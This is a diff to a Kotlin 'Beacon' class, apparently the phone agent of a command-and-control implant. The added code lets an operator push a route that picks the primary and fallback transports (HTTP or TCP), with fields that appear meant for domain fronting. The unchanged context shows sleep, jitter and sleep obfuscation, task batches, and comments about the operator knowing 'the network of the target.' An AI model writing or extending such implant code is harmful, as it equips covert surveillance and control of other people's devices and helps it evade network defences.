@@ -45,6 +45,12 @@ class Beacon(
     @Volatile private var peerAddress: String = ""
 
     /**
+     * The route the server pushed: the transport the phone speaks and the
+     * order it may fall back in.
+     */
+    @Volatile private var route: Route? = null
+
+    /**
      * Start the loop. Refuses if a thread still exists: two live loops would
      * share one session and violate the SEND-SERIAL invariant (frames must
      * leave in nonce order), so a restart waits for [stop] to have joined.
@@ -181,13 +187,32 @@ class Beacon(
 
     private fun openChannel() {
         channel?.close()
-        channel = when (config.transport.lowercase()) {
-            "http" -> HttpChannel(config.httpBaseUrl, config.httpPath)
-            else -> TcpChannel(config.host, config.port).also {
-                it.connect()
-                log("tcp connected ${config.host}:${config.port}")
+        // The route of the server decides which transport is tried first
+        // and which ones come after it.
+        val wanted = route?.transports(config.transport.lowercase())
+            ?: listOf(config.transport.lowercase())
+        var last: Throwable? = null
+        for (name in wanted) {
+            try {
+                channel = when (name) {
+                    "http" -> HttpChannel(config.httpBaseUrl, config.httpPath)
+                    "tcp" -> TcpChannel(config.host, config.port).also {
+                        it.connect()
+                        log("tcp connected ${config.host}:${config.port}")
+                    }
+                    else -> {
+                        // A transport the phone cannot speak: the route
+                        // falls back to the next one.
+                        log("the route names the transport $name, which this beacon does not speak")
+                        continue
+                    }
+                }
+                return
+            } catch (t: Throwable) {
+                last = t
             }
         }
+        throw last ?: TransportException("no transport could be opened")
     }
 
     /**
@@ -219,6 +244,29 @@ class Beacon(
         } catch (t: Throwable) {
             log("the peer listener could not bind: ${t.message}")
         }
+    }
+
+    /**
+     * Apply the route the server pushed.
+     *
+     * The route is the road the beacon has to take: the operator knows the
+     * network of the target, the beacon does not.  A transport the phone
+     * cannot speak is ignored.
+     */
+    private fun applyRoute(value: Upk?) {
+        if (value == null) return
+        val primary = value.field("primary")?.text() ?: ""
+        if (primary.isEmpty()) return
+        val fallback = (value.field("fallback")?.list() ?: emptyList())
+            .map { it.text() }
+            .filter { it.isNotEmpty() }
+        route = Route(
+            primary = primary.lowercase(),
+            fallback = fallback.map { it.lowercase() },
+            front = value.field("front")?.text() ?: "",
+            inspect = value.field("inspect")?.flag() ?: false,
+        )
+        log("the route is now ${route!!.primary} (fallback: ${route!!.fallback.joinToString(", ")})")
     }
 
     private fun handshake() {
@@ -327,6 +375,9 @@ class Beacon(
         batchBody.field("sleep")?.long()?.let { sleep = it.coerceIn(1, 86400) }
         batchBody.field("jitter")?.long()?.let { jitter = it.toInt().coerceIn(0, 90) }
         batchBody.field("obf")?.flag()?.let { sleepObfuscate = it }
+        // The route of the agent travels with the batch: the beacon learns
+        // which transport it speaks and in which order it may fall back.
+        applyRoute(batchBody.field("route"))
         val tasks = batchBody.field("tasks")?.list() ?: emptyList()
         for (task in tasks) {
             val id = task.field("id")?.text() ?: ""
